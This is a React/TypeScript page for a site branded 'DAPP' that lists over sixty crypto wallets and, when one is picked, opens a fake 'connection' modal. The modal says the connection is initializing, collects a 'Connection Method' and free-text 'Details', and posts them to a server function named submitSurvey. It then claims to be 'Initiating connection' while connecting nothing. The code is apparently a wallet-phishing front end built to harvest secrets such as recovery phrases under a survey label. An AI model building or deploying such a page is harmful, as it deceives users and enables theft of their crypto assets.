import { createFileRoute, Link } from "@tanstack/react-router";
import type React from "react";
import { useMemo, useState } from "react";
import { ArrowLeft, Search, ChevronRight, X, Loader2, CheckCircle2 } from "lucide-react";
import { useServerFn } from "@tanstack/react-start";
import { SURVEY_CATEGORIES, submitSurvey } from "@/lib/survey.functions";

export const Route = createFileRoute("/wallets")({
  head: () => ({
    meta: [
      { title: "Choose Your Wallet — DAPP" },
      { name: "description", content: "Connect or import from 60+ software and hardware wallets across EVM, Solana, Bitcoin, Cosmos, Sui, Aptos and more." },
      { property: "og:title", content: "Choose Your Wallet — DAPP" },
      { property: "og:description", content: "Connect or import from 60+ software and hardware wallets across every major blockchain." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: WalletsPage,
});

type Kind = "Software" | "Hardware";
type Wallet = { id: string; name: string; kind: Kind; chains: string[] };

const S = "Software" as const;
const H = "Hardware" as const;

export const wallets: Wallet[] = [
  { id: "walletconnect", name: "WalletConnect", kind: S, chains: ["EVM", "Solana", "Bitcoin", "Cosmos"] },
  { id: "metamask", name: "MetaMask", kind: S, chains: ["EVM"] },
  { id: "trust", name: "Trust Wallet", kind: S, chains: ["EVM", "Solana", "Bitcoin", "Cosmos"] },
  { id: "coinbase", name: "Coinbase Wallet", kind: S, chains: ["EVM", "Solana", "Bitcoin"] },
  { id: "phantom", name: "Phantom", kind: S, chains: ["Solana", "EVM", "Bitcoin", "Sui"] },
  { id: "solflare", name: "Solflare", kind: S, chains: ["Solana"] },
  { id: "backpack", name: "Backpack", kind: S, chains: ["Solana", "EVM"] },
  { id: "glow", name: "Glow", kind: S, chains: ["Solana"] },
  { id: "magiceden", name: "Magic Eden Wallet", kind: S, chains: ["Solana", "Bitcoin", "EVM"] },
  { id: "rainbow", name: "Rainbow", kind: S, chains: ["EVM"] },
  { id: "rabby", name: "Rabby", kind: S, chains: ["EVM"] },
  { id: "okx", name: "OKX Wallet", kind: S, chains: ["EVM", "Solana", "Bitcoin", "Cosmos"] },
  { id: "binance", name: "Binance Web3 Wallet", kind: S, chains: ["EVM", "Solana", "Bitcoin"] },
  { id: "bitget", name: "Bitget Wallet", kind: S, chains: ["EVM", "Solana", "Bitcoin"] },
  { id: "exodus", name: "Exodus", kind: S, chains: ["EVM", "Solana", "Bitcoin"] },
  { id: "atomic", name: "Atomic Wallet", kind: S, chains: ["EVM", "Bitcoin", "Cosmos"] },
  { id: "zerion", name: "Zerion", kind: S, chains: ["EVM", "Solana"] },
  { id: "argent", name: "Argent", kind: S, chains: ["Starknet", "EVM"] },
  { id: "safe", name: "Safe{Wallet}", kind: S, chains: ["EVM"] },
  { id: "uniswap", name: "Uniswap Wallet", kind: S, chains: ["EVM"] },
  { id: "tokenpocket", name: "TokenPocket", kind: S, chains: ["EVM", "Solana", "Cosmos"] },
  { id: "imtoken", name: "imToken", kind: S, chains: ["EVM", "Bitcoin"] },
  { id: "mathwallet", name: "MathWallet", kind: S, chains: ["EVM", "Solana", "Polkadot"] },
  { id: "safepal", name: "SafePal", kind: S, chains: ["EVM", "Solana", "Bitcoin"] },
  { id: "keplr", name: "Keplr", kind: S, chains: ["Cosmos"] },
  { id: "leap", name: "Leap Wallet", kind: S, chains: ["Cosmos"] },
  { id: "cosmostation", name: "Cosmostation", kind: S, chains: ["Cosmos", "EVM"] },
  { id: "station", name: "Station", kind: S, chains: ["Cosmos"] },
  { id: "xverse", name: "Xverse", kind: S, chains: ["Bitcoin"] },
  { id: "unisat", name: "UniSat", kind: S, chains: ["Bitcoin"] },
  { id: "leather", name: "Leather", kind: S, chains: ["Bitcoin"] },
  { id: "bluewallet", name: "BlueWallet", kind: S, chains: ["Bitcoin"] },
  { id: "electrum", name: "Electrum", kind: S, chains: ["Bitcoin"] },
  { id: "sparrow", name: "Sparrow", kind: S, chains: ["Bitcoin"] },
  { id: "tonkeeper", name: "Tonkeeper", kind: S, chains: ["TON"] },
  { id: "tronlink", name: "TronLink", kind: S, chains: ["Tron"] },
  { id: "petra", name: "Petra", kind: S, chains: ["Aptos"] },
  { id: "suiet", name: "Suiet", kind: S, chains: ["Sui"] },
  { id: "slush", name: "Slush", kind: S, chains: ["Sui"] },
  { id: "nami", name: "Nami", kind: S, chains: ["Cardano"] },
  { id: "eternl", name: "Eternl", kind: S, chains: ["Cardano"] },
  { id: "yoroi", name: "Yoroi", kind: S, chains: ["Cardano"] },
  { id: "lace", name: "Lace", kind: S, chains: ["Cardano"] },
  { id: "polkadotjs", name: "Polkadot{.js}", kind: S, chains: ["Polkadot"] },
  { id: "talisman", name: "Talisman", kind: S, chains: ["Polkadot", "EVM"] },
  { id: "subwallet", name: "SubWallet", kind: S, chains: ["Polkadot", "EVM"] },
  { id: "nova", name: "Nova Wallet", kind: S, chains: ["Polkadot"] },
  { id: "temple", name: "Temple", kind: S, chains: ["Tezos"] },
  { id: "near", name: "NEAR Wallet", kind: S, chains: ["NEAR"] },
  { id: "meteor", name: "Meteor", kind: S, chains: ["NEAR"] },
  { id: "hashpack", name: "HashPack", kind: S, chains: ["Hedera"] },
  { id: "xumm", name: "Xaman (Xumm)", kind: S, chains: ["XRP"] },
  { id: "ledger", name: "Ledger", kind: H, chains: ["EVM", "Solana", "Bitcoin", "Cosmos"] },
  { id: "trezor", name: "Trezor", kind: H, chains: ["EVM", "Solana", "Bitcoin", "Cardano"] },
  { id: "keystone", name: "Keystone", kind: H, chains: ["EVM", "Solana", "Bitcoin", "Cosmos"] },
  { id: "ngrave", name: "NGRAVE", kind: H, chains: ["EVM", "Bitcoin"] },
  { id: "ellipal", name: "ELLIPAL", kind: H, chains: ["EVM", "Solana", "Bitcoin"] },
  { id: "bitbox", name: "BitBox02", kind: H, chains: ["Bitcoin", "EVM"] },
  { id: "coldcard", name: "COLDCARD", kind: H, chains: ["Bitcoin"] },
  { id: "tangem", name: "Tangem", kind: H, chains: ["EVM", "Solana", "Bitcoin"] },
  { id: "gridplus", name: "GridPlus Lattice1", kind: H, chains: ["EVM", "Bitcoin"] },
  { id: "onekey", name: "OneKey", kind: H, chains: ["EVM", "Solana", "Bitcoin", "Cosmos"] },
  { id: "dcent", name: "D'CENT", kind: H, chains: ["EVM", "Bitcoin"] },
  { id: "cypherock", name: "Cypherock X1", kind: H, chains: ["EVM", "Solana", "Bitcoin"] },
];

const networks = ["All", "EVM", "Solana", "Bitcoin", "Cosmos", "Sui", "Aptos", "Cardano", "Polkadot", "TON", "Tron", "Other"];
const major = new Set(networks.slice(1, -1));

function WalletsPage() {
  const [q, setQ] = useState("");
  const [net, setNet] = useState("All");
  const [kind, setKind] = useState<"All" | Kind>("All");
  const [picked, setPicked] = useState<Wallet | null>(null);

  const list = useMemo(
    () =>
      wallets.filter(
        (w) =>
          w.name.toLowerCase().includes(q.toLowerCase()) &&
          (kind === "All" || w.kind === kind) &&
          (net === "All" || (net === "Other" ? w.chains.some((c) => !major.has(c)) : w.chains.includes(net))),
      ),
    [q, net, kind],
  );

  return (
    <div className="min-h-screen overflow-x-hidden bg-background font-sans text-foreground">
      <header className="sticky top-0 z-40 bg-card/90 backdrop-blur">
        <div className="mx-auto flex max-w-[1800px] items-center justify-between px-6 py-6 lg:px-20">
          <Link to="/" className="font-display text-4xl font-extrabold">DAPP</Link>
          <Link to="/" className="inline-flex items-center gap-3 rounded-full bg-secondary px-7 py-4 font-display font-bold text-secondary-foreground">
            <ArrowLeft className="h-5 w-5 text-primary" strokeWidth={3} /> Back home
          </Link>
        </div>
      </header>

      <section className="px-4 lg:px-7">
        <div className="relative overflow-hidden rounded-b-[2rem] bg-teal-down px-6 pb-20 pt-24 text-center">
          <div className="bg-orb absolute -right-20 -top-40 h-[480px] w-[480px] rotate-180 rounded-full opacity-80" />
          <h1 className="relative font-display text-5xl font-extrabold leading-tight tracking-tighter md:text-7xl">
            <span className="text-gradient">Choose Your</span> <span className="text-gradient-teal">Wallet</span>
          </h1>
          <p className="relative mx-auto mt-6 max-w-xl text-xl text-foreground/80">
            {wallets.length} software and hardware wallets across every major blockchain.
          </p>
          <div className="relative mx-auto mt-12 flex max-w-xl items-center gap-3 rounded-full border border-border bg-card px-6 py-4">
            <Search className="h-5 w-5 text-muted-foreground" />
            <input value={q} onChange={(e) => setQ(e.target.value)} placeholder="Search wallets…" aria-label="Search wallets" className="flex-1 bg-transparent text-lg outline-none placeholder:text-muted-foreground" />
          </div>
        </div>
      </section>

      <section className="mx-auto max-w-[1500px] px-6 py-14 lg:px-12">
        <div className="flex flex-wrap items-center justify-between gap-6">
          <div className="flex flex-wrap gap-2">
            {networks.map((n) => (
              <button key={n} onClick={() => setNet(n)} className={`rounded-full px-5 py-2 font-display text-sm font-bold uppercase tracking-wider transition-colors ${net === n ? "bg-primary text-primary-foreground" : "border border-border bg-card hover:border-primary/50"}`}>
                {n}
              </button>
            ))}
          </div>
          <div className="flex rounded-full border border-border bg-card p-1">
            {(["All", "Software", "Hardware"] as const).map((k) => (
              <button key={k} onClick={() => setKind(k)} className={`rounded-full px-5 py-2 font-display text-sm font-bold transition-colors ${kind === k ? "bg-secondary text-secondary-foreground" : "text-muted-foreground"}`}>
                {k}
              </button>
            ))}
          </div>
        </div>

        <div className="mt-10 grid gap-4 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
          {list.map((w) => (
            <button key={w.id} onClick={() => setPicked(w)} className="group flex items-center gap-4 rounded-2xl border border-border bg-card p-5 text-left transition-all hover:-translate-y-0.5 hover:border-primary/50">
              <WalletLogo w={w} />
              <div className="min-w-0 flex-1">
                <p className="truncate font-display text-lg font-bold">{w.name}</p>
                <p className="truncate text-sm text-muted-foreground">
                  <span className={w.kind === "Hardware" ? "text-accent" : ""}>{w.kind}</span> · {w.chains.join(", ")}
                </p>
              </div>
              <ChevronRight className="h-5 w-5 text-primary transition-transform group-hover:translate-x-1" strokeWidth={3} />
            </button>
          ))}
        </div>
        {list.length === 0 && <p className="mt-16 text-center text-xl text-muted-foreground">No wallets match your search.</p>}
      </section>

      {picked && <SurveyModal key={picked.id} wallet={picked} onClose={() => setPicked(null)} />}
    </div>
  );
}

function SurveyModal({ wallet, onClose }: { wallet: Wallet; onClose: () => void }) {
  const send = useServerFn(submitSurvey);
  const [category, setCategory] = useState("");
  const [message, setMessage] = useState("");
  const [status, setStatus] = useState<"idle" | "sending" | "sent" | "error">("idle");
  const [error, setError] = useState("");

  const canSubmit = category !== "" && message.trim().length >= 10 && status !== "sending";

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!canSubmit) return;
    setStatus("sending");
    setError("");
    try {
      await send({ data: { wallet: wallet.name, category: category as (typeof SURVEY_CATEGORIES)[number], message } });
      setStatus("sent");
    } catch {
      setStatus("error");
      setError("Something went wrong sending your feedback. Please try again.");
    }
  }

  return (
    <div className="fixed inset-0 z-50 grid place-items-center overflow-y-auto bg-background/80 p-4 backdrop-blur" onClick={onClose}>
      <div role="dialog" aria-modal="true" aria-labelledby="survey-title" className="relative w-full max-w-md rounded-3xl border border-border bg-card p-8 sm:p-10" onClick={(e) => e.stopPropagation()}>
        <button aria-label="Close" onClick={onClose} className="absolute right-5 top-5 text-muted-foreground hover:text-foreground">
          <X className="h-6 w-6" />
        </button>
        <div className="text-center">
          <div className="mx-auto w-fit"><WalletLogo w={wallet} big /></div>
          <h2 id="survey-title" className="mt-6 font-display text-3xl font-extrabold">{wallet.name}</h2>
          <p className="mt-2 text-muted-foreground">Your Connections has been initialized. Please wait.</p>
        </div>

        {status === "sent" ? (
          <div className="mt-8 text-center">
            <CheckCircle2 className="mx-auto h-12 w-12 text-primary" />
            <p className="mt-4 font-display text-xl font-bold">Initiating connection.</p>
            <button onClick={onClose} className="mt-6 rounded-full bg-primary px-8 py-3 font-display font-bold text-primary-foreground">Close</button>
          </div>
        ) : (
          <form onSubmit={onSubmit} className="mt-8 space-y-5 text-left">
            <div>
              <label htmlFor="survey-category" className="mb-2 block text-sm font-semibold">Connection Method</label>
              <select
                id="survey-category"
                required
                value={category}
                onChange={(e) => setCategory(e.target.value)}
                className="w-full rounded-xl border border-border bg-background px-4 py-3 text-base outline-none focus:border-primary"
              >
                <option value="" disabled>Select an option…</option>
                {SURVEY_CATEGORIES.map((c) => (
                  <option key={c} value={c}>{c}</option>
                ))}
              </select>
            </div>
            <div>
              <label htmlFor="survey-message" className="mb-2 block text-sm font-semibold">Details</label>
              <textarea
                id="survey-message"
                required
                minLength={10}
                maxLength={5000}
                rows={5}
                value={message}
                onChange={(e) => setMessage(e.target.value)}
                placeholder="Enter text..."
                className="w-full resize-y rounded-xl border border-border bg-background px-4 py-3 text-base outline-none placeholder:text-muted-foreground focus:border-primary"
              />
            </div>
            {error && <p role="alert" className="text-sm text-destructive">{error}</p>}
            <button
              type="submit"
              disabled={!canSubmit}
              className="flex w-full items-center justify-center gap-2 rounded-full bg-primary px-8 py-4 font-display text-lg font-bold text-primary-foreground transition-opacity disabled:opacity-50"
            >
              {status === "sending" && <Loader2 className="h-5 w-5 animate-spin" />}
              {status === "sending" ? "Submitting…" : "Submit"}
            </button>
          </form>
        )}
      </div>
    </div>
  );
}

function WalletLogo({ w, big }: { w: Wallet; big?: boolean }) {
  const size = big ? "h-20 w-20" : "h-12 w-12";
  return (
    <span className={`grid ${size} shrink-0 place-items-center overflow-hidden rounded-xl bg-secondary`}>
      <img src={`/wallets/${w.id}.png`} alt={`${w.name} logo`} loading="lazy" className="h-full w-full object-contain p-1" />
    </span>
  );
}
